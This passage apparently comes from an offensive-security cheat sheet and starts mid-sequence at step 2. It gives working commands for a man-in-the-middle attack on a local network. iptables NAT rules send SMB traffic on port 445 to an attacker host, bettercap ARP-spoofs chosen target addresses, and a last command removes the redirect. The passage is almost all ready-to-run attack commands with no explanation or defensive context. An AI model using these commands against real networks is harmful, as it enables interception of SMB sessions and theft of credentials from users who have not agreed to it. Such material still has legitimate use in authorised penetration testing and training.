2. Redirect desired ports back to attacker system
~~~
# smb, exclude attacker system
$ iptables -t nat -A PREROUTING -p tcp ! --src <attacker_ip> --dport 445 -j DNAT --to-destination <attacker_ip>:445
~~~

3. ARP spoof with bettercap
~~~
$ bettercap
# set targets (defaults to entire subnet)
> set arp.spoof.targets 10.0.0.2,10.0.0.3
> arp.spoof on
~~~

~~~
$ iptables -t nat -D PREROUTING -p tcp ! --src <attacker_ip> --dport 445 -j DNAT --to-destination <attacker_ip>:445
